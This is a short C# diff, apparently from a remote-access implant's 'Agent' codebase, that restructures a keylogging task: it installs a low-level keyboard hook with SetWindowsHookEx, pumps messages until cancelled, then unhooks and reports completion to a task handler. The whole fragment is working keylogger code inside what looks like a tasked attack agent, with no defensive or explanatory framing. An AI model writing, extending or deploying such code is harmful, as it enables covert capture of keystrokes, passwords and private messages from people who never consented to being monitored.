@@ -58,22 +58,19 @@ namespace Agent
 
             try
             {
-                Task.Run(() =>
+                Native.HookProc callback = CallbackFunction;
+                var module = Process.GetCurrentProcess().MainModule.ModuleName;
+                var moduleHandle = Native.GetModuleHandle(module);
+                var hook = Native.SetWindowsHookEx(Native.HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
+                while (!cts.Token.IsCancellationRequested)
                 {
-                    Native.HookProc callback = CallbackFunction;
-                    var module = Process.GetCurrentProcess().MainModule.ModuleName;
-                    var moduleHandle = Native.GetModuleHandle(module);
-                    var hook = Native.SetWindowsHookEx(Native.HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
-                    while (!cts.Token.IsCancellationRequested)
-                    {
-                        Native.PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
-                        System.Threading.Thread.Sleep(5);
-                    }
+                    Native.PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
+                    System.Threading.Thread.Sleep(5);
+                }
 
-                    Native.UnhookWindowsHookEx(hook);
+                Native.UnhookWindowsHookEx(hook);
 
-                    messageManager.WriteLine("Finished executing.", task_id, true);
-                }, cts.Token);
+                messageManager.WriteLine("Finished executing.", task_id, true);
             }
             catch (Exception ex)
             {
